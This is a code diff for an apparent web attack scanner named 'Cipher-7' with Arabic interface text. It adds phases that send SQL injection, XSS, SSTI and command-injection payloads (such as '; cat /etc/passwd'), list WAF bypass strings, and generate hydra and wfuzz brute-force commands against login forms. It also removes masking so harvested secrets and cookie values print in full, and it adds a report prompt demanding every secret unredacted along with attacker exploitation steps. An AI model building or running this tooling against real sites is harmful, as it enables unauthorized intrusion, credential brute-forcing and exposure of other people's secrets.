+  riskScore += httpMethodResults.filter(m => m.sensitive).length * 5;
+  riskScore += infoDisclosures.length * 5;
+  riskScore += authWeaknesses.length * 10;
+  if (webData.wafDetected) riskScore = Math.max(0, riskScore - 5); // WAF slightly reduces risk
   riskScore = Math.min(100, riskScore);
 
   // ═══ BUILD EXPLOITATION GUIDE PER SECRET TYPE ═══
@@ -8037,7 +8748,7 @@ if __name__ == "__main__":
         ``,
         ...webCipher7Crypto.slice(0, 20).map(f =>
           f.type === "jwt" ? `🔑 [JWT] ${f.original} → alg:${f.metadata?.algorithm || "?"}` :
-          `🔓 [${f.type.toUpperCase()}] ${f.original.slice(0, 40)} → ${f.decoded.slice(0, 60)}`
+          `🔓 [${f.type.toUpperCase()}] ${f.original} → ${f.decoded}`
         ),
       ].filter(Boolean),
       commands: [`echo "BASE64_STRING" | base64 -d`, `echo "JWT_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool`],
@@ -8078,7 +8789,7 @@ if __name__ == "__main__":
         `   🟡 عالي: ${webCipher7AWS.filter(f => f.severity === "high").length}`,
         `   🟠 متوسط: ${webCipher7AWS.filter(f => f.severity === "medium").length}`,
         ``,
-        ...webCipher7AWS.map(f => `   ${f.severity === "critical" ? "🔴" : f.severity === "high" ? "🟡" : "🟠"} [${f.category}] ${f.value.slice(0, 80)} — ${f.detail}`),
+        ...webCipher7AWS.map(f => `   ${f.severity === "critical" ? "🔴" : f.severity === "high" ? "🟡" : "🟠"} [${f.category}] ${f.value} — ${f.detail}`),
         webCipher7AWS.length === 0 ? `   ✅ لم يتم اكتشاف موارد AWS مكشوفة` : "",
       ].filter(Boolean),
       commands: webCipher7AWS.filter(f => f.command).map(f => f.command!),
@@ -8089,12 +8800,12 @@ if __name__ == "__main__":
       status: missingHeaders.length > 3 || corsVulnerable ? "danger" : missingHeaders.length > 1 ? "warning" : "success",
       findings: [
         `═══ ترويسات الأمان ═══`,
-        secHeaders.csp ? `   ✅ Content-Security-Policy: ${secHeaders.csp.slice(0, 100)}` : `   🔴 Content-Security-Policy: مفقود`,
+        secHeaders.csp ? `   ✅ Content-Security-Policy: ${secHeaders.csp}` : `   🔴 Content-Security-Policy: مفقود`,
         secHeaders.hsts ? `   ✅ Strict-Transport-Security: ${secHeaders.hsts}` : `   🔴 Strict-Transport-Security: مفقود`,
         secHeaders.xFrameOptions ? `   ✅ X-Frame-Options: ${secHeaders.xFrameOptions}` : `   🔴 X-Frame-Options: مفقود (عرضة لـ Clickjacking)`,
         secHeaders.xContentType ? `   ✅ X-Content-Type-Options: ${secHeaders.xContentType}` : `   🟡 X-Content-Type-Options: مفقود`,
         secHeaders.referrerPolicy ? `   ✅ Referrer-Policy: ${secHeaders.referrerPolicy}` : `   🟡 Referrer-Policy: مفقود`,
-        secHeaders.permissionsPolicy ? `   ✅ Permissions-Policy: ${secHeaders.permissionsPolicy.slice(0, 100)}` : `   🟡 Permissions-Policy: مفقود`,
+        secHeaders.permissionsPolicy ? `   ✅ Permissions-Policy: ${secHeaders.permissionsPolicy}` : `   🟡 Permissions-Policy: مفقود`,
         ``, `═══ CORS ═══`,
         corsVulnerable ? `   🔴 CORS مفتوح — Access-Control-Allow-Origin: ${secHeaders.cors || "*"}` : `   ✅ CORS: ${secHeaders.cors || "غير مُعيّن"}`,
         ``, `═══ تسريب معلومات ═══`,
@@ -8165,7 +8876,7 @@ if __name__ == "__main__":
         `   $ dirb ${baseUrl} /usr/share/dirb/wordlists/common.txt`,
         `   $ gobuster dir -u ${baseUrl} -w /usr/share/wordlists/dirb/common.txt`,
         ``, `═══ AWS Commands (${webCipher7AWS.filter(f => f.command).length}) ═══`,
-        ...webCipher7AWS.filter(f => f.command).slice(0, 10).map(f => `   $ ${f.command!.slice(0, 100)}`),
+        ...webCipher7AWS.filter(f => f.command).slice(0, 10).map(f => `   $ ${f.command!}`),
         ``, `═══ Firebase Commands ═══`,
         firebaseApiKey ? `   $ curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=${firebaseApiKey}" -H "Content-Type: application/json" -d '{}'` : "",
         firebaseDbUrl ? `   $ curl -s "${firebaseDbUrl}/.json?shallow=true"` : "",
@@ -8244,7 +8955,7 @@ if __name__ == "__main__":
         `═══ فحص Directory Traversal / LFI ═══`,
         `🎯 النقاط المفحوصة: ${traversalTargets.length}`,
         ...vulnResults.filter(v => v.type === "Directory Traversal / LFI").map(v =>
-          `   🔴 [CRITICAL] LFI في: ${v.url}\n      الحمولة: ${v.payload}\n      الدليل: ${v.evidence.slice(0, 100)}`
+          `   🔴 [CRITICAL] LFI في: ${v.url}\n      الحمولة: ${v.payload}\n      الدليل: ${v.evidence}`
         ),
         vulnResults.filter(v => v.type === "Directory Traversal / LFI").length === 0 ? `   ✅ لم يتم اكتشاف ثغرات LFI` : "",
         ``,
@@ -8297,9 +9008,240 @@ if __name__ == "__main__":
         `for sub in ${commonSubdomains.slice(0, 10).join(" ")}; do host $sub.${baseDomain} 2>/dev/null && echo "$sub.${baseDomain} exists"; done`,
       ],
     },
+    // ═══ NEW ENHANCED PHASES (v11.0) ═══
+    {
+      id: 18, title: "Cipher-7: الزاحف العميق — Deep Web Crawler (Phase 11)",
+      details: `${webData.crawledPages.length} صفحة مكتشفة — ${webData.allForms.length} نموذج (form) — ${webData.crawledPages.reduce((s, p) => s + p.inputs, 0)} حقل إدخال`,
+      status: webData.allForms.length > 0 ? "success" : "info",
+      findings: [
+        `╔══════════════════════════════════════════════════════════════╗`,
+        `║   CIPHER-7 v11.0 — DEEP WEB CRAWLER                         ║`,
+        `╚══════════════════════════════════════════════════════════════╝`,
+        ``,
+        `🕷️ الصفحات المكتشفة: ${webData.crawledPages.length}`,
+        `📝 النماذج (Forms) المكتشفة: ${webData.allForms.length}`,
+        `📋 حقول الإدخال الإجمالية: ${webData.crawledPages.reduce((s, p) => s + p.inputs, 0)}`,
+        ``,
+        `═══ الصفحات المكتشفة ═══`,
+        ...webData.crawledPages.slice(0, 20).map(p =>
+          `   ${p.status < 400 ? "🟢" : "🔴"} [${p.status}] ${p.url}${p.title ? ` — ${p.title}` : ""}${p.forms.length > 0 ? ` (${p.forms.length} form)` : ""}`
+        ),
+        ``,
+        `═══ النماذج المكتشفة للاختبار ═══`,
+        ...webData.allForms.slice(0, 15).map((f, i) =>
+          `   📝 Form #${i + 1}: ${f.method} ${f.action}\n      الحقول: ${f.inputs.map(inp => `${inp.name}(${inp.type})`).join(", ")}\n      الصفحة: ${f.page}`
+        ),
+        webData.allForms.length === 0 ? `   ℹ️ لم يتم اكتشاف نماذج HTML` : "",
+      ].filter(Boolean),
+      commands: [
+        `curl -s "${webData.url}" | grep -oP 'href="[^"]*"' | sort -u`,
+        `wget --spider --force-html -r -l 3 "${webData.url}" 2>&1 | grep "^--"`,
+      ],
+    },
+    {
+      id: 19, title: "Cipher-7: تحليل أمان الكوكيز — Cookie Security (Phase 12)",
+      details: `${webData.cookies.length} كوكي — ${webData.cookies.filter(c => c.issues.length > 0).length} بها مشاكل أمنية`,
+      status: webData.cookies.filter(c => c.issues.length > 0).length > 0 ? "warning" : webData.cookies.length > 0 ? "success" : "info",
+      findings: [
+        `╔══════════════════════════════════════════════════════════════╗`,
+        `║   CIPHER-7 — COOKIE SECURITY ANALYSIS                        ║`,
+        `╚══════════════════════════════════════════════════════════════╝`,
+        ``,
+        `🍪 الكوكيز المكتشفة: ${webData.cookies.length}`,
+        `⚠️ كوكيز بها مشاكل: ${webData.cookies.filter(c => c.issues.length > 0).length}`,
+        ``,
+        ...webData.cookies.map(c => [
+          `═══ ${c.name} ═══`,
+          `   القيمة: ${c.value}`,
+          `   HttpOnly: ${c.httpOnly ? "✅ نعم" : "❌ لا"}`,
+          `   Secure: ${c.secure ? "✅ نعم" : "❌ لا"}`,
+          `   SameSite: ${c.sameSite || "غير محدد"}`,
+          `   Path: ${c.path}`,
+          c.expires ? `   Expires: ${c.expires}` : "",
+          ...c.issues.map(issue => `   ${issue}`),
+          ``,
+        ]).flat(),
+        webData.cookies.length === 0 ? `   ℹ️ لم يتم اكتشاف كوكيز في الاستجابة الأولى` : "",
+      ].filter(Boolean),
+      commands: [
+        `curl -I -s "${webData.url}" | grep -i "set-cookie"`,
+        `curl -c - -s "${webData.url}" | tail -10`,
+      ],
+    },
+    {
+      id: 20, title: "Cipher-7: كشف DOM XSS — JavaScript Sink Analysis (Phase 13)",
+      details: `${webData.domXssSinks.length} DOM sink مكتشف — ${webData.domXssSinks.filter(s => s.severity === "critical").length} حرج`,
+      status: webData.domXssSinks.filter(s => s.severity === "critical").length > 0 ? "danger" : webData.domXssSinks.length > 0 ? "warning" : "success",
+      findings: [
+        `╔══════════════════════════════════════════════════════════════╗`,
+        `║   CIPHER-7 — DOM XSS SINK DETECTION (JavaScript Analysis)    ║`,
+        `╚══════════════════════════════════════════════════════════════╝`,
+        ``,
+        `🔍 إجمالي DOM Sinks: ${webData.domXssSinks.length}`,
+        `🔴 حرج (innerHTML, eval, document.write): ${webData.domXssSinks.filter(s => s.severity === "critical").length}`,
+        `🟡 عالي (jQuery .html(), insertAdjacentHTML): ${webData.domXssSinks.filter(s => s.severity === "high").length}`,
+        `🟠 متوسط (.src, window.open): ${webData.domXssSinks.filter(s => s.severity === "medium").length}`,
+        ``,
+        `═══ DOM XSS Sinks المكتشفة ═══`,
+        ...webData.domXssSinks.slice(0, 30).map(s =>
+          `   ${s.severity === "critical" ? "🔴" : s.severity === "high" ? "🟡" : "🟠"} [${s.severity.toUpperCase()}] ${s.sink}\n      الملف: ${s.file}\n      السياق: ${s.context}`
+        ),
+        ``,
+        webData.domXssSinks.length > 0 ? `⚠️ هذه النقاط تمثل مواقع محتملة لهجمات DOM-based XSS — إذا وصل إدخال المستخدم لأي من هذه النقاط بدون تنقية، يمكن تنفيذ JavaScript خبيث` : `✅ لم يتم اكتشاف DOM sinks خطيرة`,
+      ].filter(Boolean),
+      commands: [
+        `grep -r "innerHTML" --include="*.js" ./`,
+        `grep -r "eval(" --include="*.js" ./`,
+        `grep -r "document.write" --include="*.js" ./`,
+      ],
+    },
+    {
+      id: 21, title: "Cipher-7: كشف جدار الحماية WAF (Phase 14)",
+      details: webData.wafDetected ? `WAF مكتشف: ${webData.wafDetected}` : "لم يتم اكتشاف WAF",
+      status: webData.wafDetected ? "warning" : "info",
+      findings: [
+        `╔══════════════════════════════════════════════════════════════╗`,
+        `║   CIPHER-7 — WAF DETECTION & BYPASS ANALYSIS                 ║`,
+        `╚══════════════════════════════════════════════════════════════╝`,
+        ``,
+        webData.wafDetected ? `🛡️ WAF مكتشف: ${webData.wafDetected}` : `ℹ️ لم يتم اكتشاف جدار حماية ويب (WAF)`,
+        ``,
+        webData.wafDetected ? `═══ تأثير WAF على الاختبار ═══` : "",
+        webData.wafDetected ? `   ⚠️ جدار الحماية قد يحجب بعض الحمولات — يتم استخدام تقنيات التجاوز التالية:` : "",
+        webData.wafDetected ? `   • Comment bypass: 1'/**/OR/**/1=1--` : "",
+        webData.wafDetected ? `   • Case mixing: 1' oR 1=1--` : "",
+        webData.wafDetected ? `   • Encoding: %3Cscript%3Ealert(1)%3C/script%3E` : "",
+        webData.wafDetected ? `   • Polyglot payloads` : "",
+        webData.wafDetected ? `   • Double encoding: %252e%252e%252f` : "",
+        ``,
+        !webData.wafDetected ? `⚠️ عدم وجود WAF يعني أن جميع الحمولات تصل مباشرة إلى الخادم بدون فلترة` : "",
+      ].filter(Boolean),
+      commands: [
+        `wafw00f "${webData.url}"`,
+        `nmap --script http-waf-detect -p 80,443 ${domain}`,
+      ],
+    },
+    {
+      id: 22, title: "Cipher-7: اختبار النماذج (Forms) — SQLi + XSS (Phase 15)",
+      details: `${formSqliResults.length} SQLi + ${formXssResults.length} XSS في ${webData.allForms.length} نموذج`,
+      status: formSqliResults.length > 0 ? "danger" : formXssResults.length > 0 ? "warning" : webData.allForms.length > 0 ? "success" : "info",
+      findings: [
+        `╔══════════════════════════════════════════════════════════════╗`,
+        `║   CIPHER-7 — FORM-BASED VULNERABILITY TESTING                ║`,
+        `╚══════════════════════════════════════════════════════════════╝`,
+        ``,
+        `📝 النماذج المفحوصة: ${webData.allForms.length}`,
+        `💉 SQLi في النماذج: ${formSqliResults.length}`,
+        `🎯 XSS في النماذج: ${formXssResults.length}`,
+        ``,
+        formSqliResults.length > 0 ? `═══ SQL Injection في النماذج ═══` : "",
+        ...formSqliResults.map(r =>
+          `   🔴 [CRITICAL] ${r.vulnType}\n      النموذج: ${r.form.method} ${r.form.action}\n      الحقل: ${r.field}\n      الحمولة: ${r.payload}\n      الدليل: ${r.evidence}`
+        ),
+        formSqliResults.length === 0 ? `   ✅ لم يتم اكتشاف SQLi في النماذج` : "",
+        ``,
+        formXssResults.length > 0 ? `═══ XSS في النماذج ═══` : "",
+        ...formXssResults.map(r =>
+          `   🟡 [HIGH] ${r.vulnType}\n      النموذج: ${r.form.method} ${r.form.action}\n      الحقل: ${r.field}\n      الحمولة: ${r.payload}`
+        ),
+        formXssResults.length === 0 ? `   ✅ لم يتم اكتشاف XSS في النماذج` : "",
+      ].filter(Boolean),
+      commands: webData.allForms.slice(0, 3).map(f =>
+        `curl -X ${f.method} "${f.action}" -d "${f.inputs.map(i => `${i.name}=' OR '1'='1`).join("&")}"`
+      ),
+    },
+    {
+      id: 23, title: "Cipher-7: اختبار SSTI + Command Injection (Phase 16)",
+      details: `${vulnResults.filter(v => v.type.includes("SSTI")).length} SSTI + ${vulnResults.filter(v => v.type.includes("Command")).length} CmdI`,
+      status: vulnResults.filter(v => v.type.includes("SSTI") || v.type.includes("Command")).length > 0 ? "danger" : "success",
+      findings: [
+        `╔══════════════════════════════════════════════════════════════╗`,
+        `║   CIPHER-7 — SSTI & COMMAND INJECTION TESTING                ║`,
+        `╚══════════════════════════════════════════════════════════════╝`,
+        ``,
+        `═══ Server-Side Template Injection (SSTI) ═══`,
+        `🎯 النقاط المفحوصة: ${sstiTargets.length}`,
+        `💉 الحمولات: {{7*7}}, \${7*7}, #{7*7}, <%= 7*7 %>, وأكثر`,
+        `🔴 الثغرات: ${vulnResults.filter(v => v.type.includes("SSTI")).length}`,
+        ``,
+        ...vulnResults.filter(v => v.type.includes("SSTI")).map(v =>
+          `   🔴 [CRITICAL] ${v.type}\n      URL: ${v.url}\n      الحمولة: ${v.payload}\n      الدليل: ${v.evidence}`
+        ),
+        vulnResults.filter(v => v.type.includes("SSTI")).length === 0 ? `   ✅ لم يتم اكتشاف SSTI` : "",
+        ``,
+        `═══ Command Injection (OS) ═══`,
+        `🎯 النقاط المفحوصة: ${cmdTargets.length + cmdFormTargets.length}`,
+        `💉 الحمولات: ; cat /etc/passwd, | id, $(whoami), وأكثر`,
+        `🔴 الثغرات: ${vulnResults.filter(v => v.type.includes("Command")).length}`,
+        ``,
+        ...vulnResults.filter(v => v.type.includes("Command")).map(v =>
+          `   🔴 [CRITICAL] ${v.type}\n      URL: ${v.url}\n      الحمولة: ${v.payload}\n      الدليل: ${v.evidence}`
+        ),
+        vulnResults.filter(v => v.type.includes("Command")).length === 0 ? `   ✅ لم يتم اكتشاف Command Injection` : "",
+      ].filter(Boolean),
+      commands: [
+        `curl "${baseUrl}/api/exec?cmd=;id"`,
+        `curl "${baseUrl}/api/ping?host=127.0.0.1;cat+/etc/passwd"`,
+      ],
+    },
+    {
+      id: 24, title: "Cipher-7: اختبار HTTP Methods + تسريب المعلومات (Phase 17)",
+      details: `${httpMethodResults.filter(m => m.sensitive).length} طريقة خطيرة — ${infoDisclosures.length} تسريب`,
+      status: httpMethodResults.filter(m => m.sensitive).length > 0 || infoDisclosures.length > 0 ? "warning" : "success",
+      findings: [
+        `╔══════════════════════════════════════════════════════════════╗`,
+        `║   CIPHER-7 — HTTP METHOD TESTING & INFO DISCLOSURE           ║`,
+        `╚══════════════════════════════════════════════════════════════╝`,
+        ``,
+        `═══ HTTP Methods المسموحة ═══`,
+        ...httpMethodResults.filter(m => m.allowed).map(m =>
+          `   ${m.sensitive ? "🔴" : "🟡"} ${m.method} ${m.url} — HTTP ${m.status} ${m.sensitive ? "(خطير!)" : ""}`
+        ),
+        httpMethodResults.filter(m => m.sensitive).length === 0 ? `   ✅ لا توجد طرق HTTP خطيرة مسموحة` : "",
+        ``,
+        `═══ تسريب المعلومات ═══`,
+        ...infoDisclosures.map(d =>
+          `   ${d.severity === "high" ? "🔴" : "🟡"} [${d.type}] ${d.url}\n      ${d.detail}`
+        ),
+        infoDisclosures.length === 0 ? `   ✅ لم يتم اكتشاف تسريب معلومات` : "",
+      ].filter(Boolean),
+      commands: [
+        `for m in PUT DELETE TRACE PATCH; do echo "=== $m ==="; curl -X $m -s -o /dev/null -w "%{http_code}" "${baseUrl}"; done`,
+        `curl -s "${baseUrl}/nonexistent" | head -50`,
+      ],
+    },
+    {
+      id: 25, title: "Cipher-7: اختبار المصادقة — Default Creds + Rate Limit (Phase 18)",
+      details: `${authWeaknesses.length} ضعف مصادقة — ${loginForms.length} نموذج تسجيل دخول`,
+      status: authWeaknesses.filter(a => a.type === "Default Credentials").length > 0 ? "danger" : authWeaknesses.length > 0 ? "warning" : "success",
+      findings: [
+        `╔══════════════════════════════════════════════════════════════╗`,
+        `║   CIPHER-7 — AUTHENTICATION WEAKNESS DETECTION               ║`,
+        `╚══════════════════════════════════════════════════════════════╝`,
+        ``,
+        `🔑 نماذج تسجيل الدخول: ${loginForms.length}`,
+        `🔓 نقاط API للمصادقة: ${loginEndpoints.length}`,
+        `⚠️ نقاط ضعف المصادقة: ${authWeaknesses.length}`,
+        ``,
+        authWeaknesses.filter(a => a.type === "Default Credentials").length > 0 ? `═══ بيانات اعتماد افتراضية ═══` : "",
+        ...authWeaknesses.filter(a => a.type === "Default Credentials").map(a =>
+          `   🔴 [CRITICAL] ${a.detail}\n      URL: ${a.url}`
+        ),
+        ``,
+        authWeaknesses.filter(a => a.type === "No Rate Limiting").length > 0 ? `═══ غياب Rate Limiting ═══` : "",
+        ...authWeaknesses.filter(a => a.type === "No Rate Limiting").map(a =>
+          `   🟡 [HIGH] ${a.detail}\n      URL: ${a.url}\n      ⚠️ يمكن تنفيذ هجوم Brute Force بدون قيود`
+        ),
+        authWeaknesses.length === 0 ? `   ✅ لم يتم اكتشاف ضعف في المصادقة` : "",
+      ].filter(Boolean),
+      commands: [
+        `hydra -l admin -P /usr/share/wordlists/rockyou.txt ${domain} http-post-form "/login:username=^USER^&password=^PASS^:Invalid"`,
+        `wfuzz -c -z file,/usr/share/wordlists/rockyou.txt -d "username=admin&password=FUZZ" --hc 403,401 ${baseUrl}/login`,
+      ],
+    },
     // ═══ EXPLOITATION GUIDES (one step per secret type) ═══
     ...exploitGuides.map((guide, idx) => ({
-      id: 18 + idx,
+      id: 26 + idx,
       title: `دليل الاستغلال: ${guide.secretType}`,
       details: guide.description,
       status: "danger" as const,
@@ -8374,25 +9316,42 @@ ${webhookSecretsListing || "لا يوجد"}
 نتائج AWS:
 ${awsSecretsListing || "لا يوجد"}
 
-نتائج الفحص العميق (Deep Vulnerability Scan):
-- SQL Injection: ${vulnResults.filter(v => v.type === "SQL Injection").length} ثغرة
-- XSS: ${vulnResults.filter(v => v.type === "Reflected XSS").length} ثغرة
-- SSRF: ${vulnResults.filter(v => v.type === "SSRF").length} ثغرة
+نتائج الفحص العميق (Deep Vulnerability Scan v11.0):
+- SQL Injection (URL-based): ${vulnResults.filter(v => v.type.includes("SQL") && !v.type.includes("Form")).length} ثغرة
+- SQL Injection (Form-based): ${formSqliResults.length} ثغرة
+- SQL Injection (Blind): ${vulnResults.filter(v => v.type.includes("Blind")).length} ثغرة
+- XSS (URL-based): ${vulnResults.filter(v => v.type.includes("XSS") && !v.type.includes("Form")).length} ثغرة
+- XSS (Form-based): ${formXssResults.length} ثغرة
+- DOM XSS Sinks: ${webData.domXssSinks.length} (${webData.domXssSinks.filter(s => s.severity === "critical").length} حرج)
+- SSTI: ${vulnResults.filter(v => v.type.includes("SSTI")).length} ثغرة
+- Command Injection: ${vulnResults.filter(v => v.type.includes("Command")).length} ثغرة
+- SSRF: ${vulnResults.filter(v => v.type.includes("SSRF")).length} ثغرة
 - Directory Traversal/LFI: ${vulnResults.filter(v => v.type === "Directory Traversal / LFI").length} ثغرة
 - Open Redirect: ${vulnResults.filter(v => v.type === "Open Redirect").length} ثغرة
 - CRLF Injection: ${vulnResults.filter(v => v.type === "CRLF Injection").length} ثغرة
 - النطاقات الفرعية النشطة: ${discoveredSubdomains.length}
+- الكوكيز غير الآمنة: ${webData.cookies.filter(c => c.issues.length > 0).length}/${webData.cookies.length}
+- HTTP Methods خطيرة: ${httpMethodResults.filter(m => m.sensitive).length}
+- تسريب معلومات: ${infoDisclosures.length}
+- ضعف المصادقة: ${authWeaknesses.length}
+- WAF: ${webData.wafDetected || "غير مكتشف"}
+- صفحات مزحوفة: ${webData.crawledPages.length}
+- نماذج مكتشفة: ${webData.allForms.length}
 ${vulnResults.map(v => `  [${v.severity.toUpperCase()}] ${v.type}: ${v.url} — Payload: ${v.payload}`).join("\n")}
 
 اكتب تقريراً يشمل:
 1. ملخص تنفيذي
 2. الثغرات الحرجة مع التفاصيل التقنية
-3. تحليل السطح الهجومي للويب
+3. تحليل السطح الهجومي للويب (شاملاً نتائج الزاحف العميق)
 4. نتائج فحص الترويسات الأمنية
 5. نتائج فحص Firebase/AWS
-6. نتائج الفحص العميق (SQLi, XSS, SSRF, LFI, Open Redirect)
-7. جميع الأسرار والمفاتيح المكتشفة مكتوبة بالكامل بدون أي تشفير أو إخفاء
-8. لكل سر مكتشف: اشرح خطوات الاستغلال العملية التي يقوم بها المخترق + الأوامر الفعلية
+6. نتائج الفحص العميق (SQLi المتقدم، XSS، SSTI، Command Injection، SSRF، LFI)
+7. نتائج اختبار النماذج (Form-based testing)
+8. تحليل أمان الكوكيز
+9. تحليل DOM XSS Sinks في JavaScript
+10. نتائج كشف WAF
+11. جميع الأسرار والمفاتيح المكتشفة مكتوبة بالكامل بدون أي تشفير أو إخفاء
+12. لكل سر مكتشف: اشرح خطوات الاستغلال العملية التي يقوم بها المخترق + الأوامر الفعلية
 9. توصيات الإصلاح بالأولوية
 10. خلاصة المخاطر
 
@@ -8450,7 +9409,34 @@ ${vulnResults.map(v => `  [${v.severity.toUpperCase()}] ${v.type}: ${v.url} — 
       totalVulns: vulnResults.length,
       criticalVulns: vulnResults.filter(v => v.severity === "critical").length,
       highVulns: vulnResults.filter(v => v.severity === "high").length,
+      mediumVulns: vulnResults.filter(v => v.severity === "medium").length,
+      formSqliCount: formSqliResults.length,
+      formXssCount: formXssResults.length,
+      sstiCount: vulnResults.filter(v => v.type.includes("SSTI")).length,
+      cmdInjectionCount: vulnResults.filter(v => v.type.includes("Command")).length,
+      blindSqliCount: vulnResults.filter(v => v.type.includes("Blind")).length,
     },
+    crawler: {
+      pagesDiscovered: webData.crawledPages.length,
+      formsDiscovered: webData.allForms.length,
+      totalInputs: webData.crawledPages.reduce((s, p) => s + p.inputs, 0),
+      pages: webData.crawledPages.map(p => ({ url: p.url, status: p.status, title: p.title, forms: p.forms.length, inputs: p.inputs })),
+    },
+    cookieAnalysis: {
+      cookies: webData.cookies,
+      insecureCookies: webData.cookies.filter(c => c.issues.length > 0).length,
+      totalCookies: webData.cookies.length,
+    },
+    domXss: {
+      sinks: webData.domXssSinks.slice(0, 50),
+      totalSinks: webData.domXssSinks.length,
+      criticalSinks: webData.domXssSinks.filter(s => s.severity === "critical").length,
+      highSinks: webData.domXssSinks.filter(s => s.severity === "high").length,
+    },
+    wafDetection: webData.wafDetected,
+    httpMethods: httpMethodResults,
+    infoDisclosures,
+    authWeaknesses,
     exploitGuides: exploitGuides.map(g => ({
       secretType: g.secretType,
       secretValue: g.secretValue,
@@ -8464,9 +9450,9 @@ ${vulnResults.map(v => `  [${v.severity.toUpperCase()}] ${v.type}: ${v.url} — 
       crypto: webCipher7Crypto,
       aws: webCipher7AWS,
       securityHeaders: secHeaders,
-      totalFindings: webCipher7Crypto.length + webCipher7AWS.length + allSecrets.length + accessiblePaths.length + missingHeaders.length + vulnResults.length,
-      phasesExecuted: 10,
-      engineVersion: "10.0-web",
+      totalFindings: webCipher7Crypto.length + webCipher7AWS.length + allSecrets.length + accessiblePaths.length + missingHeaders.length + vulnResults.length + webData.domXssSinks.length + webData.cookies.filter(c => c.issues.length > 0).length + infoDisclosures.length + authWeaknesses.length,
+      phasesExecuted: 18,
+      engineVersion: "11.0-web",
     },
     generatedAt: new Date().toISOString(),
     targetUrl: webData.url,
